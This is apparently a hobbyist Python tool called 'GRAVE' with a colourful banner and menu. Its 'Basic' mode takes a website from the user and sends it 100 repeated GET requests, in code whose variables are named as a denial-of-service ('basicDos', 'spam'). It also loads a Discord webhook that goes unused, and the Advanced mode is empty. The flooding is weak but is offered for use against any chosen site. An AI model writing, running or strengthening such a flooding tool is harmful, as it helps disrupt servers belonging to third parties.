import requests as req
import time
import json as js
from pystyle import Write, Colorate, Colors
import os

title = '''
  ▄████  ██▀███   ▄▄▄    ██▒   █▓▓█████ 
 ██▒ ▀█▒▓██ ▒ ██▒▒████▄ ▓██░   █▒▓█   ▀ 
▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄▓██  █▒░▒███   
░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██▒██ █░░▒▓█  ▄ 
░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒▀█░  ░▒████▒
 ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▐░  ░░ ░░ ░
  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ░  ░
░ ░   ░   ░░   ░   ░   ▒     ░░     ░   
      ░    ░           ░  ░   ░     ░  ░
                             ░          
'''
print(Colorate.Horizontal(Colors.blue_to_white, title, 1))

list = '''
-------------------------------------------------------
[[[                   [0] Basic                    ]]]
[[[                   [1] Advanced                 ]]]
[[[                   [H] Help                     ]]]
-------------------------------------------------------
'''
print(Colorate.Horizontal(Colors.blue_to_white, list, 1))

userInput = Write.Input(os.getlogin() + "~$ ", Colors.blue_to_purple, interval=0.01)

http = "https://"
config_path = os.path.join(os.path.dirname(__file__), "config.json")

try:
    with open(config_path, 'r') as config_file:
        configuration = js.load(config_file)
except FileNotFoundError:
    print(f"Configuration file not found. Ensure it exists at: {config_path}")
    exit(1)

hook = configuration.get("discord-webhook")

if userInput == '0' or userInput == 'zero':
    basicDos = Write.Input(os.getlogin() + " || Web" + "~$ ", Colors.blue_to_purple, interval=0.01)
    basicDos = basicDos.strip()
    bdos_Res = http + basicDos

    try:
        response_bdos = req.get(bdos_Res)
        if response_bdos.status_code == 200:
            with open(f"{basicDos}.txt", "w") as output1:
                output1.write(response_bdos.text)
    except req.exceptions.RequestException as e:
        print(f"Error occurred while making the request: {e}")

    if not os.path.exists('out'):
        os.makedirs('out')

    def spam():
        try:
            req.get(bdos_Res)
            with open(f"out/{basicDos}.spam.txt", "w") as spamfile1:
                spamfile1.write("started spamming")
        except req.exceptions.RequestException as e:
            print(f"Error occurred while spamming: {e}")

    spam_count = 0
    max_spam = 100

    while spam_count < max_spam:
        spam()
        spam_count += 1
        time.sleep(0.5)

    print(f"Completed {spam_count} spam requests.")
